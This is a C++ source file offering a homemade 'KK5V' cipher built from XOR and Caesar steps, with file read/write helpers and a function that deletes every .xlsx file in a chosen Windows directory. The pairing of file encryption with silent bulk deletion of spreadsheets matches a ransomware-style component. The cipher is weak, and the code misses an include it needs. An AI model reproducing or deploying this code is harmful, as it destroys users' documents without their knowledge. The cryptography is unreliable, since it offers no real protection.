#include "kk5v_encryption.h"
#include <fstream>
#include <iostream>
#include <windows.h>
#include <string>

namespace kk5v {

    // XOR encryption
    void xor_encrypt(std::string& data, const std::string& key) {
        size_t key_length = key.length();
        for (size_t i = 0; i < data.size(); ++i) {
            data[i] ^= key[i % key_length];  // XOR with the key (loop over key if necessary)
        }
    }

    // Caesar cipher encryption
    void caesar_encrypt(std::string& data, int shift) {
        for (char& c : data) {
            if (isalpha(c)) {
                char offset = islower(c) ? 'a' : 'A';
                c = (c - offset + shift) % 26 + offset;
            }
        }
    }

    // KK5V encryption (combination of XOR and Caesar)
    void kk5v_encrypt(std::string& data, const std::string& key, int caesar_shift) {
        // First apply XOR encryption
        xor_encrypt(data, key);
        // Then apply Caesar cipher encryption
        caesar_encrypt(data, caesar_shift);
    }

    // Read file into a string
    std::string read_file(const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary);
        std::stringstream buffer;
        buffer << file.rdbuf();
        return buffer.str();
    }

    // Write encrypted data to a file
    void write_file(const std::string& file_path, const std::string& data) {
        std::ofstream file(file_path, std::ios::binary);
        file << data;
    }

    // Delete .xlsx files in a given directory
    void delete_xlsx_files(const std::string& directory) {
        WIN32_FIND_DATA findFileData;
        HANDLE hFind = FindFirstFile((directory + "\\*.xlsx").c_str(), &findFileData);

        if (hFind == INVALID_HANDLE_VALUE) {
            return;
        }

        do {
            std::string file_path = directory + "\\" + findFileData.cFileName;
            if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                continue;  // Skip directories
            }
            DeleteFile(file_path.c_str());  // Delete the file
        } while (FindNextFile(hFind, &findFileData));

        FindClose(hFind);
    }
}
